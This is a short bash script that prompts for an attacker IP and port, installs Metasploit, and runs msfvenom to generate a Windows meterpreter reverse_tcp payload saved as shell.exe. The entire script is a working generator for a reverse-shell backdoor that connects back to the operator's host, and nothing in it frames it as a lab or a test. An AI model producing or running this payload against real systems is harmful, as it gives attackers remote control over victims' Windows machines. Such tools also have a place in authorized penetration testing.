#!/bin/bash

# Prompt user for LHOST and LPORT
read -p "Enter LHOST (your IP): " LHOST
read -p "Enter LPORT (your port): " LPORT

if [[ -z "$LHOST" || -z "$LPORT" ]]; then
    echo "[-] LHOST or LPORT cannot be empty."
    exit 1
fi


# Confirm values
echo "[*] Using LHOST=$LHOST and LPORT=$LPORT"
sudo apt update
sudo apt install Metasploit

# Generate payload with msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe

echo "[+] Payload generated as shell.exe"


